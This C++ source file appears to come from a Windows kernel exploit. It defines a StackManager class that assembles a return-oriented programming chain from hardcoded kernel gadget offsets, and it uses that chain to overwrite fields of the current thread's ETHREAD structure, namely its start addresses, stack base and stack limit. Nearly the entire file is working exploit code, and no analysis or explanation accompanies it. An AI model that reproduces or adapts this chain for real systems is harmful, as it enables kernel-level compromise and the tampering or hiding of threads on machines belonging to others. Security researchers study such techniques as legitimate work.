#include <include/stack/stack_manager.hpp>

std::uint64_t* StackManager::GetStackBuffer()
{
	return Stack->data();
}

std::size_t StackManager::GetStackSize()
{
	return Stack->size() * sizeof(std::uint64_t);
}

void StackManager::AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName)
{
	const std::uint64_t GadgetAddress = KernelModuleBase + GadgetOffset;
	std::printf("[+] RSP+0x%x\tGadget %s (0x%p)\n", this->GetStackSize(), GadgetLogName.data(), GadgetAddress);
	Stack->push_back(GadgetAddress);
}

void StackManager::AddValue(const std::uint64_t Value, const std::string_view& ValueLogName)
{
	std::printf("[+] RSP+0x%x\tValue %s (0x%p)\n", this->GetStackSize(), ValueLogName.data(), Value);
	Stack->push_back(Value);
}

void StackManager::AddPadding(const std::size_t PaddingSize)
{
	// TODO: Make this a cyclic func.
	// right now it's just hardcoded.
	for (int i = 0; i < (PaddingSize / sizeof(std::uint64_t)); i++)
		this->AddValue(0xC0FEBABEC0FEBABE, "Padding");
}

void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
{
	this->AddFunctionCall("PsGetCurrentThread");

	// r9->rcx->NewValue, Setup value to write. It has a sideeffect on eax so we perform thiss
	// before the rest of our chain.
	this->AddGadget(0x47f82d, "pop r8; ret;");
	this->AddValue(0, "set r8 to 0");
	this->AddGadget(0x24cd7b, "pop rcx; ret;");
	this->AddValue(NewValue, "New field value");
	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");

	// rax = Thread + Offset inside of ETHREAD, which we will write to
	this->AddGadget(0x24cd7b, "pop rcx; ret;");
	this->AddValue(FieldOffset, "ETHREAD offset");
	this->AddGadget(0x263f08, "add rax, rcx; ret;");
	this->AddGadget(0x3c4eac, "mov qword ptr [rax], r9; ret;");
}

void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
{
	constexpr std::uint64_t EThreadStartAddressOffset = 0x4e0;
	constexpr std::uint64_t EThreadWin32StartAddressOffset = 0x560;
	this->ModifyThreadField(EThreadStartAddressOffset, NewStartAddress);
	this->ModifyThreadField(EThreadWin32StartAddressOffset, NewStartAddress);
}

void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit)
{
	constexpr std::uint64_t EThreadStackBaseOffset = 0x38;
	constexpr std::uint64_t EThreadStackLimitOffset = 0x30;
	this->ModifyThreadField(EThreadStackBaseOffset, NewStackBase);
	this->ModifyThreadField(EThreadStackLimitOffset, NewStackLimit);
}
